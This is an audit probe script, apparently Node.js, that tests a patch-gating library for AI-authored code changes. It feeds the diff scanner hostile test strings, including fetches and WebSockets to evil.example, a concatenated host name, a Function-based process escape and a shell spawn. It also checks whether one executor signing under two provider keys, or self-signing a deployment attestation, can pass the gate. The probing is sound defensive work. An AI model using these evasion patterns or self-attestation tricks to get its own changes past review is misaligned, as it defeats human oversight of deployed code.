// Claude A0 audit probe. Usage: node claude-a0-probe.mjs <checkout-root-of-PR-221-head-da8cc52b>
// Uses only synthetic data and throwaway Ed25519 keys generated in memory; no network, no secrets.
import fs from 'node:fs';
import {generateKeyPairSync,sign} from 'node:crypto';
const ROOT=process.argv[2]||'.';
const L=await import(ROOT+'/scripts/lib/patchgate.mjs');
const policy=JSON.parse(fs.readFileSync(ROOT+'/config/patch-policy.json','utf8'));
const f=(p,diff='@@ -0,0 +1 @@\n+x\n',mode='100644')=>({path:p,mode,old_mode:mode,binary:false,diff});
console.log('--- classify');
for(const p of ['ltzzz-memory/魄.md','knowledge/results/dispatch/oversight/latest.json','ops/派单台账.md','knowledge/results/rentahuman/stage2a-copilot-20261022.json','scripts/funded-invest-executor.mjs','scripts/provision-funding-executor.mjs','scripts/prepare-treasury-migration.mjs','scripts/lib/proxy-auth.mjs','scripts/package.json','docs/x.md','config/review-delegation.json'])
  console.log(p.padEnd(62),L.classify(policy,[f(p)]).level);
console.log('--- scan');
const add=s=>L.scanDiff(policy,[f('scripts/a.mjs','@@ -0,0 +1 @@\n+'+s+'\n')]).map(x=>x.code).join(',')||'(none)';
for(const s of ["const ws=new WebSocket('wss://evil.example/x')","const g=Function('return process')()","import {spawn} from 'x'; spawn('sh',['-c','id'])","fetch('//evil.example')","const h='ev'+'il.example';fetch('https://'+h)","see task-queue-runner-config-notes for details","risk-adjusted-return-calculation-method","fetch('https://gist.github.com/attacker/abc')"])
  console.log(s.padEnd(60),'=>',add(s));
console.log('--- same executor, two providers');
const kp=()=>generateKeyPairSync('ed25519');
const k1=kp(),k2=kp();
const pem=k=>k.publicKey.export({type:'spki',format:'pem'});
const trust={schema_version:1,enabled:true,keys:[
 {id:'k-openai',enabled:true,provider:'openai',executor:'SAME-EXECUTOR',roles:['author','checks'],not_before:'2026-01-01T00:00:00Z',not_after:'2027-01-01T00:00:00Z',public_key_pem:pem(k1)},
 {id:'k-qwen',enabled:true,provider:'aliyun_dashscope',executor:'SAME-EXECUTOR',roles:['review'],not_before:'2026-01-01T00:00:00Z',not_after:'2027-01-01T00:00:00Z',public_key_pem:pem(k2)}]};
const base='a'.repeat(40),head='b'.repeat(40);
const snapshot={repository:'ltzyz2181-collab/ltzzz',task_id:'PATCH-TEST-0001',base_sha:base,head_sha:head,policy_sha256:L.sha256(L.canonical(policy)),trust_sha256:L.sha256(L.canonical(trust)),files:[f('scripts/lib/foo.mjs')]};
const subject=L.subjectFor(snapshot);const now=Date.now();
const att=(key,id,payload)=>{const p={...payload,subject,at_utc:new Date(now-1000).toISOString()};return {key_id:id,payload:p,signature:sign(null,Buffer.from(L.canonical(p)),key.privateKey).toString('base64')}};
const atts=[att(k1,'k-openai',{role:'author'}),att(k1,'k-openai',{role:'checks',passed:true,checker_base_sha:base,checks_sha256:'c'.repeat(64)}),
 att(k2,'k-qwen',{role:'review',verdict:'approve',generation_verified:true,model:'qwen-plus',output_sha256:'d'.repeat(64),metadata_source:'provider_response',finish_reason:'stop'})];
const r=L.evaluate({policy,trust,snapshot,attestations:atts,now});
console.log({risk:r.risk_class,passed:r.validation_passed,status:r.status,reasons:r.reasons});
console.log('--- self-signed deployment verification');
const policy2={...policy,canary_targets:[{url:'https://canary-x.sub.workers.dev'}]};
trust.keys[0].roles.push('deployment');
const snap2={...snapshot,policy_sha256:L.sha256(L.canonical(policy2)),trust_sha256:L.sha256(L.canonical(trust)),files:[f('workers/x/index.js')]};
const sub2=L.subjectFor(snap2);
const body=L.canonical({schema:'ltzzz.patchgate.canary.v1',source_commit:head})+'\n';
const t0=new Date(now-3000).toISOString(),t1=new Date(now-1000).toISOString();
const ev={head_sha:head,base_sha:base,target_environment:'canary',expected_version_id:'v1',observation:{url:'https://canary-x.sub.workers.dev',http_status:200,redirected:false,body_base64:Buffer.from(body).toString('base64'),body_sha256:L.sha256(Buffer.from(body)),header_source_commit:head,header_version_id:'v1',started_at_utc:t0,finished_at_utc:t1,http_date:t1},platform:{http_status:200,service_name:'canary-x',source:'cloudflare_current_deployment_api',observed_at_utc:t1,versions:[{id:'v1',percentage:100}]}};
const mk=(key,id,payload)=>{const p={...payload,subject:sub2,at_utc:new Date(now-500).toISOString()};return {key_id:id,payload:p,signature:sign(null,Buffer.from(L.canonical(p)),key.privateKey).toString('base64')}};
const r2=L.evaluate({policy:policy2,trust,snapshot:snap2,attestations:[mk(k1,'k-openai',{role:'author'}),mk(k1,'k-openai',{role:'checks',passed:true,checker_base_sha:base,checks_sha256:'c'.repeat(64)}),mk(k2,'k-qwen',{role:'review',verdict:'approve',generation_verified:true,model:'m',output_sha256:'d'.repeat(64),metadata_source:'provider_response',finish_reason:'stop'}),mk(k1,'k-openai',{role:'deployment',evidence:ev})],now});
console.log({risk:r2.risk_class,passed:r2.validation_passed,deployment:r2.deployment_verification?.status,reasons:r2.reasons});
